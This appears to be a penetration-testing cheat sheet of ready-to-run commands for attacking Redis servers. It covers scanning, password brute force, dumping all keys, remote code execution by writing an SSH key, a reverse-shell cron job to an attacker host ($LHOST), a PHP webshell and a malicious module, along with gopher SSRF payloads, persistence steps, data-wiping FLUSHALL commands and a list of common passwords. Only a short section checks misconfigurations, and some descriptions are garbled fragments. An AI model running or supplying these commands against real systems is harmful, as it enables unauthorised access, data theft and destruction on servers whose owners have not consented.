---
id: "e1xakua8vmptluy2y"
title: "redis"
description: ""
tags: []
order: "17"
createdAt: "2026-05-31T09:56:43.402Z"
updatedAt: "2026-05-31T09:56:55.559Z"
---

## Reconnaissance
<!-- section: {"id":"m736mar3dmptlv3dx","order":0,"collapsed":false} -->

### quufqk50amptlv3g6
```bash
nmap -sV -sC -p 6379 $TARGET
```

_Reconnaissance Scan for Redis default port._

**Tags:** redis, recon, nmap, rustscan
<!-- cmd: {"id":"quufqk50amptlv3g6","language":"bash","sectionId":"m736mar3dmptlv3dx","tags":["redis","recon","nmap","rustscan"]} -->

### 2k94twpinmptlv3gb
```bash
rustscan -a $TARGET -p 6379 -- -sV --script redis-info
```

**Tags:** redis, recon, nmap, rustscan
<!-- cmd: {"id":"2k94twpinmptlv3gb","language":"bash","sectionId":"m736mar3dmptlv3dx","tags":["redis","recon","nmap","rustscan"]} -->

### tvbcq1rgcmptlv3gh
```bash
nmap -p 6379 --script=redis-info,redis-brute $TARGET
```

**Tags:** redis, recon, nmap, rustscan
<!-- cmd: {"id":"tvbcq1rgcmptlv3gh","language":"bash","sectionId":"m736mar3dmptlv3dx","tags":["redis","recon","nmap","rustscan"]} -->

## Unauthenticated Access Check
<!-- section: {"id":"gpp83lfjkmptlv3e6","order":1,"collapsed":false} -->

### ntjujxyt6mptlv3gt
```bash
redis-cli -h $TARGET ping
```

_Unauthenticated Access Check Test for open Redis with no auth required._

**Tags:** redis, unauthenticated, enumeration
<!-- cmd: {"id":"ntjujxyt6mptlv3gt","language":"bash","sectionId":"gpp83lfjkmptlv3e6","tags":["redis","unauthenticated","enumeration"]} -->

### b1wdr0rgimptlv3gy
```bash
redis-cli -h $TARGET info
```

**Tags:** redis, unauthenticated, enumeration
<!-- cmd: {"id":"b1wdr0rgimptlv3gy","language":"bash","sectionId":"gpp83lfjkmptlv3e6","tags":["redis","unauthenticated","enumeration"]} -->

### 9tvr33rgvmptlv3h2
```bash
redis-cli -h $TARGET info server
```

**Tags:** redis, unauthenticated, enumeration
<!-- cmd: {"id":"9tvr33rgvmptlv3h2","language":"bash","sectionId":"gpp83lfjkmptlv3e6","tags":["redis","unauthenticated","enumeration"]} -->

### 2efv8tct6mptlv3h6
```bash
redis-cli -h $TARGET info keyspace
```

**Tags:** redis, unauthenticated, enumeration
<!-- cmd: {"id":"2efv8tct6mptlv3h6","language":"bash","sectionId":"gpp83lfjkmptlv3e6","tags":["redis","unauthenticated","enumeration"]} -->

### p6s178so0mptlv3hc
```bash
redis-cli -h $TARGET CONFIG GET *
```

**Tags:** redis, unauthenticated, enumeration
<!-- cmd: {"id":"p6s178so0mptlv3hc","language":"bash","sectionId":"gpp83lfjkmptlv3e6","tags":["redis","unauthenticated","enumeration"]} -->

## Authentication
<!-- section: {"id":"2ib4hq00omptlv3ea","order":2,"collapsed":false} -->

### 367ksllbumptlv3hq
```bash
redis-cli -h $TARGET -a $PASS
```

_Authentication Connect with password._

**Tags:** redis, authentication
<!-- cmd: {"id":"367ksllbumptlv3hq","language":"bash","sectionId":"2ib4hq00omptlv3ea","tags":["redis","authentication"]} -->

### p41nmm9ckmptlv3hw
```bash
redis-cli -h $TARGET AUTH $PASS
```

**Tags:** redis, authentication
<!-- cmd: {"id":"p41nmm9ckmptlv3hw","language":"bash","sectionId":"2ib4hq00omptlv3ea","tags":["redis","authentication"]} -->

### cqzefvzlamptlv3i1
```bash
redis-cli -h $TARGET -p 6379 -a $PASS PING
```

**Tags:** redis, authentication
<!-- cmd: {"id":"cqzefvzlamptlv3i1","language":"bash","sectionId":"2ib4hq00omptlv3ea","tags":["redis","authentication"]} -->

## Brute Force
<!-- section: {"id":"qbxnzpsx7mptlv3ef","order":3,"collapsed":false} -->

### gbb1zel5hmptlv3ia
```bash
hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET
```

_Brute Force_

**Tags:** redis, bruteforce, hydra
<!-- cmd: {"id":"gbb1zel5hmptlv3ia","language":"bash","sectionId":"qbxnzpsx7mptlv3ef","tags":["redis","bruteforce","hydra"]} -->

### tf372rhgxmptlv3if
```bash
nmap -p 6379 --script redis-brute $TARGET
```

**Tags:** redis, bruteforce, hydra
<!-- cmd: {"id":"tf372rhgxmptlv3if","language":"bash","sectionId":"qbxnzpsx7mptlv3ef","tags":["redis","bruteforce","hydra"]} -->

### v2fmqrqlqmptlv3ik
```bash
redis-cli -h $TARGET AUTH "" 2>/dev/null && echo "No auth required"
```

**Tags:** redis, bruteforce, hydra
<!-- cmd: {"id":"v2fmqrqlqmptlv3ik","language":"bash","sectionId":"qbxnzpsx7mptlv3ef","tags":["redis","bruteforce","hydra"]} -->

## Data Enumeration
<!-- section: {"id":"489yk9f1gmptlv3ek","order":4,"collapsed":false} -->

### xnyqjv8pcmptlv3iy
```bash
redis-cli -h $TARGET KEYS "*"
```

_Data Enumeration Dump keys and values from Redis._

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"xnyqjv8pcmptlv3iy","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### kw08h03apmptlv3j3
```bash
redis-cli -h $TARGET GET "key_name"
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"kw08h03apmptlv3j3","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### l03bt5e5smptlv3j8
```bash
redis-cli -h $TARGET --scan | while read key; do echo "KEY: $key"; redis-cli -h $TARGET GET "$key"; done
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"l03bt5e5smptlv3j8","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### 7xyk4mjfvmptlv3jd
```bash
redis-cli -h $TARGET INFO keyspace
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"7xyk4mjfvmptlv3jd","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### nggcwvoc2mptlv3jh
```bash
redis-cli -h $TARGET SELECT 0
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"nggcwvoc2mptlv3jh","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### lgvh570uumptlv3jn
```bash
redis-cli -h $TARGET SELECT 1
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"lgvh570uumptlv3jn","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### 6lf7chsybmptlv3js
```bash
redis-cli -h $TARGET TYPE "key_name"
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"6lf7chsybmptlv3js","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### nizck01r0mptlv3jw
```bash
redis-cli -h $TARGET LRANGE "key_name" 0 -1
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"nizck01r0mptlv3jw","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### yphew2yv2mptlv3k1
```bash
redis-cli -h $TARGET HGETALL "key_name"
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"yphew2yv2mptlv3k1","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

### sv02pvxq5mptlv3k6
```bash
redis-cli -h $TARGET SMEMBERS "key_name"
```

**Tags:** redis, enumeration, datadump
<!-- cmd: {"id":"sv02pvxq5mptlv3k6","language":"bash","sectionId":"489yk9f1gmptlv3ek","tags":["redis","enumeration","datadump"]} -->

## RCE via SSH Key Write
<!-- section: {"id":"qixkhiri2mptlv3eo","order":5,"collapsed":false} -->

### 9ztukchuzmptlv3kk
```bash
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""
```

_RCE via SSH Key Write Write attacker SSH public key to authorized_

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"9ztukchuzmptlv3kk","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### i0xca047gmptlv3ko
```bash
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/redis_key.txt
```

_rsa.pub; echo -e "\n\n") > /tmp/redis_

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"i0xca047gmptlv3ko","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### 8rk36cn9bmptlv3ku
```bash
redis-cli -h $TARGET FLUSHALL
```

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"8rk36cn9bmptlv3ku","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### 4m8iaowx9mptlv3l2
```bash
redis-cli -h $TARGET SET payload "$(cat /tmp/redis_key.txt)"
```

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"4m8iaowx9mptlv3l2","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### b2w4f2eudmptlv3l7
```bash
redis-cli -h $TARGET CONFIG SET dir /root/.ssh
```

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"b2w4f2eudmptlv3l7","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### olza0cus7mptlv3lb
```bash
redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
```

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"olza0cus7mptlv3lb","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### 5kima1u85mptlv3lh
```bash
redis-cli -h $TARGET BGSAVE
```

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"5kima1u85mptlv3lh","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

### q9iu74tximptlv3lm
```bash
ssh -i /tmp/redis_rsa root@$TARGET
```

**Tags:** redis, rce, ssh, filewrite, exploitation
<!-- cmd: {"id":"q9iu74tximptlv3lm","language":"bash","sectionId":"qixkhiri2mptlv3eo","tags":["redis","rce","ssh","filewrite","exploitation"]} -->

## RCE via Cron Job Write
<!-- section: {"id":"i49kzi32gmptlv3et","order":6,"collapsed":false} -->

### xfg2mp16lmptlv3lv
```bash
redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/crontabs
```

_RCE via Cron Job Write Write a reverse shell cron job via Redis CONFIG SET._

**Tags:** redis, rce, cron, persistence, exploitation
<!-- cmd: {"id":"xfg2mp16lmptlv3lv","language":"bash","sectionId":"i49kzi32gmptlv3et","tags":["redis","rce","cron","persistence","exploitation"]} -->

### pj40isjr8mptlv3m0
```bash
redis-cli -h $TARGET CONFIG SET dbfilename root
```

**Tags:** redis, rce, cron, persistence, exploitation
<!-- cmd: {"id":"pj40isjr8mptlv3m0","language":"bash","sectionId":"i49kzi32gmptlv3et","tags":["redis","rce","cron","persistence","exploitation"]} -->

### r9tjnh691mptlv3m5
```bash
redis-cli -h $TARGET SET payload "\n\n* * * * * bash -i >& /dev/tcp/$LHOST/4444 0>&1\n\n"
```

**Tags:** redis, rce, cron, persistence, exploitation
<!-- cmd: {"id":"r9tjnh691mptlv3m5","language":"bash","sectionId":"i49kzi32gmptlv3et","tags":["redis","rce","cron","persistence","exploitation"]} -->

### ed1jw9pg6mptlv3m9
```bash
redis-cli -h $TARGET BGSAVE
```

**Tags:** redis, rce, cron, persistence, exploitation
<!-- cmd: {"id":"ed1jw9pg6mptlv3m9","language":"bash","sectionId":"i49kzi32gmptlv3et","tags":["redis","rce","cron","persistence","exploitation"]} -->

## RCE via Webshell Write
<!-- section: {"id":"lm4m15lnsmptlv3ex","order":7,"collapsed":false} -->

### 4k7roanjdmptlv3mt
```bash
redis-cli -h $TARGET CONFIG SET dir /var/www/html
```

_RCE via Webshell Write Write PHP webshell if web root is known._

**Tags:** redis, rce, webshell, exploitation
<!-- cmd: {"id":"4k7roanjdmptlv3mt","language":"bash","sectionId":"lm4m15lnsmptlv3ex","tags":["redis","rce","webshell","exploitation"]} -->

### e3xwz3raomptlv3my
```bash
redis-cli -h $TARGET CONFIG SET dbfilename shell.php
```

**Tags:** redis, rce, webshell, exploitation
<!-- cmd: {"id":"e3xwz3raomptlv3my","language":"bash","sectionId":"lm4m15lnsmptlv3ex","tags":["redis","rce","webshell","exploitation"]} -->

### bmsjfhblkmptlv3n2
```bash
redis-cli -h $TARGET SET payload "<?php system(\$_GET['cmd']); ?>"
```

**Tags:** redis, rce, webshell, exploitation
<!-- cmd: {"id":"bmsjfhblkmptlv3n2","language":"bash","sectionId":"lm4m15lnsmptlv3ex","tags":["redis","rce","webshell","exploitation"]} -->

### fnk11bo3dmptlv3n7
```bash
redis-cli -h $TARGET BGSAVE
```

**Tags:** redis, rce, webshell, exploitation
<!-- cmd: {"id":"fnk11bo3dmptlv3n7","language":"bash","sectionId":"lm4m15lnsmptlv3ex","tags":["redis","rce","webshell","exploitation"]} -->

### ps3d8o5ebmptlv3nc
```bash
curl "http://$TARGET/shell.php?cmd=id"
```

**Tags:** redis, rce, webshell, exploitation
<!-- cmd: {"id":"ps3d8o5ebmptlv3nc","language":"bash","sectionId":"lm4m15lnsmptlv3ex","tags":["redis","rce","webshell","exploitation"]} -->

## RCE via Redis Module (Redis 4.x+)
<!-- section: {"id":"uabhjwt1amptlv3f2","order":8,"collapsed":false} -->

### tvgb1pow8mptlv3nl
```bash
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

_RCE via Redis Module (Redis 4.x+) Load a malicious Redis module for OS command execution._

**Tags:** redis, rce, module, exploitation
<!-- cmd: {"id":"tvgb1pow8mptlv3nl","language":"bash","sectionId":"uabhjwt1amptlv3f2","tags":["redis","rce","module","exploitation"]} -->

### 5z2afa1c2mptlv3nq
```bash
cd RedisModules-ExecuteCommand && make
```

**Tags:** redis, rce, module, exploitation
<!-- cmd: {"id":"5z2afa1c2mptlv3nq","language":"bash","sectionId":"uabhjwt1amptlv3f2","tags":["redis","rce","module","exploitation"]} -->

### qh7ebd4timptlv3nv
```bash
redis-cli -h $TARGET MODULE LOAD /path/to/module.so
```

**Tags:** redis, rce, module, exploitation
<!-- cmd: {"id":"qh7ebd4timptlv3nv","language":"bash","sectionId":"uabhjwt1amptlv3f2","tags":["redis","rce","module","exploitation"]} -->

### qmxqz6qhqmptlv3o0
```bash
redis-cli -h $TARGET system.exec "id"
```

**Tags:** redis, rce, module, exploitation
<!-- cmd: {"id":"qmxqz6qhqmptlv3o0","language":"bash","sectionId":"uabhjwt1amptlv3f2","tags":["redis","rce","module","exploitation"]} -->

### k499un3jfmptlv3o3
```bash
redis-cli -h $TARGET system.exec "bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"
```

**Tags:** redis, rce, module, exploitation
<!-- cmd: {"id":"k499un3jfmptlv3o3","language":"bash","sectionId":"uabhjwt1amptlv3f2","tags":["redis","rce","module","exploitation"]} -->

## SSRF via Redis (Gopher Protocol)
<!-- section: {"id":"ue0obz8kqmptlv3f7","order":9,"collapsed":false} -->

### 7uf3jv8nbmptlv3og
```bash
gopher://$TARGET:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
```

_SSRF via Redis (Gopher Protocol) Use SSRF to interact with Redis via gopher:// URLs._

**Tags:** redis, ssrf, gopher, exploitation
<!-- cmd: {"id":"7uf3jv8nbmptlv3og","language":"bash","sectionId":"ue0obz8kqmptlv3f7","tags":["redis","ssrf","gopher","exploitation"]} -->

### m5qsaifxcmptlv3ol
```bash
python3 gopherus.py --exploit redis
```

**Tags:** redis, ssrf, gopher, exploitation
<!-- cmd: {"id":"m5qsaifxcmptlv3ol","language":"bash","sectionId":"ue0obz8kqmptlv3f7","tags":["redis","ssrf","gopher","exploitation"]} -->

## Persistence
<!-- section: {"id":"o8bvyr75ymptlv3fb","order":10,"collapsed":false} -->

### jipk75pzdmptlv3oy
```bash
redis-cli -h $TARGET SET backdoor "$(cat /tmp/redis_rsa.pub)"
```

_Persistence_

**Tags:** redis, persistence
<!-- cmd: {"id":"jipk75pzdmptlv3oy","language":"bash","sectionId":"o8bvyr75ymptlv3fb","tags":["redis","persistence"]} -->

### yvl5gk4l1mptlv3p3
```bash
redis-cli -h $TARGET CONFIG SET save "60 1"
```

**Tags:** redis, persistence
<!-- cmd: {"id":"yvl5gk4l1mptlv3p3","language":"bash","sectionId":"o8bvyr75ymptlv3fb","tags":["redis","persistence"]} -->

### lhcd1lghomptlv3p8
```bash
redis-cli -h $TARGET BGSAVE
```

**Tags:** redis, persistence
<!-- cmd: {"id":"lhcd1lghomptlv3p8","language":"bash","sectionId":"o8bvyr75ymptlv3fb","tags":["redis","persistence"]} -->

### 0vsqpm7i9mptlv3pd
```bash
redis-cli -h $TARGET CONFIG GET save
```

**Tags:** redis, persistence
<!-- cmd: {"id":"0vsqpm7i9mptlv3pd","language":"bash","sectionId":"o8bvyr75ymptlv3fb","tags":["redis","persistence"]} -->

### b9gxvc6q3mptlv3pi
```bash
redis-cli -h $TARGET CONFIG GET dir
```

**Tags:** redis, persistence
<!-- cmd: {"id":"b9gxvc6q3mptlv3pi","language":"bash","sectionId":"o8bvyr75ymptlv3fb","tags":["redis","persistence"]} -->

### i4ybxd1hymptlv3pn
```bash
redis-cli -h $TARGET CONFIG GET dbfilename
```

**Tags:** redis, persistence
<!-- cmd: {"id":"i4ybxd1hymptlv3pn","language":"bash","sectionId":"o8bvyr75ymptlv3fb","tags":["redis","persistence"]} -->

## Common Misconfigurations
<!-- section: {"id":"p5vn0agj4mptlv3fg","order":11,"collapsed":false} -->

### 9ti0uj134mptlv3px
```bash
redis-cli -h $TARGET PING
```

_Common Misconfigurations_

**Tags:** redis, misconfiguration, hardening
<!-- cmd: {"id":"9ti0uj134mptlv3px","language":"bash","sectionId":"p5vn0agj4mptlv3fg","tags":["redis","misconfiguration","hardening"]} -->

### uf8wqvdg2mptlv3q1
```bash
redis-cli -h $TARGET CONFIG GET protected-mode
```

**Tags:** redis, misconfiguration, hardening
<!-- cmd: {"id":"uf8wqvdg2mptlv3q1","language":"bash","sectionId":"p5vn0agj4mptlv3fg","tags":["redis","misconfiguration","hardening"]} -->

### 76j7rzsg0mptlv3q6
```bash
redis-cli -h $TARGET CONFIG GET bind
```

**Tags:** redis, misconfiguration, hardening
<!-- cmd: {"id":"76j7rzsg0mptlv3q6","language":"bash","sectionId":"p5vn0agj4mptlv3fg","tags":["redis","misconfiguration","hardening"]} -->

### alhpwtffnmptlv3qb
```bash
redis-cli -h $TARGET INFO server | grep redis_version
```

**Tags:** redis, misconfiguration, hardening
<!-- cmd: {"id":"alhpwtffnmptlv3qb","language":"bash","sectionId":"p5vn0agj4mptlv3fg","tags":["redis","misconfiguration","hardening"]} -->

### fvl4uuyacmptlv3qg
```bash
redis-cli -h $TARGET ACL LIST
```

**Tags:** redis, misconfiguration, hardening
<!-- cmd: {"id":"fvl4uuyacmptlv3qg","language":"bash","sectionId":"p5vn0agj4mptlv3fg","tags":["redis","misconfiguration","hardening"]} -->

### rv7kra8jmmptlv3qk
```bash
redis-cli -h $TARGET ACL WHOAMI
```

**Tags:** redis, misconfiguration, hardening
<!-- cmd: {"id":"rv7kra8jmmptlv3qk","language":"bash","sectionId":"p5vn0agj4mptlv3fg","tags":["redis","misconfiguration","hardening"]} -->

## Default Credentials
<!-- section: {"id":"8w2mjqel8mptlv3fl","order":12,"collapsed":false} -->

### 05rivmxtimptlv3rf
```bash
(no password — default in older versions)
```

_Default Credentials_
<!-- cmd: {"id":"05rivmxtimptlv3rf","language":"bash","sectionId":"8w2mjqel8mptlv3fl"} -->

### ja4vb6ccpmptlv3rl
```bash
requirepass "" — empty string
```
<!-- cmd: {"id":"ja4vb6ccpmptlv3rl","language":"bash","sectionId":"8w2mjqel8mptlv3fl"} -->

### rmg77xmr4mptlv3rp
```bash
redis
```

_Common passwords found in the wild:_

**Tags:** redis, default-credentials
<!-- cmd: {"id":"rmg77xmr4mptlv3rp","language":"bash","sectionId":"8w2mjqel8mptlv3fl","tags":["redis","default-credentials"]} -->

### l84tab7c2mptlv3ru
```bash
Redis
```

**Tags:** redis, default-credentials
<!-- cmd: {"id":"l84tab7c2mptlv3ru","language":"bash","sectionId":"8w2mjqel8mptlv3fl","tags":["redis","default-credentials"]} -->

### t1iszjl4umptlv3rz
```bash
password
```

**Tags:** redis, default-credentials
<!-- cmd: {"id":"t1iszjl4umptlv3rz","language":"bash","sectionId":"8w2mjqel8mptlv3fl","tags":["redis","default-credentials"]} -->

### kendv4kykmptlv3s3
```bash
123456
```

**Tags:** redis, default-credentials
<!-- cmd: {"id":"kendv4kykmptlv3s3","language":"bash","sectionId":"8w2mjqel8mptlv3fl","tags":["redis","default-credentials"]} -->

### afuh1vb8qmptlv3s9
```bash
foobared
```

**Tags:** redis, default-credentials
<!-- cmd: {"id":"afuh1vb8qmptlv3s9","language":"bash","sectionId":"8w2mjqel8mptlv3fl","tags":["redis","default-credentials"]} -->
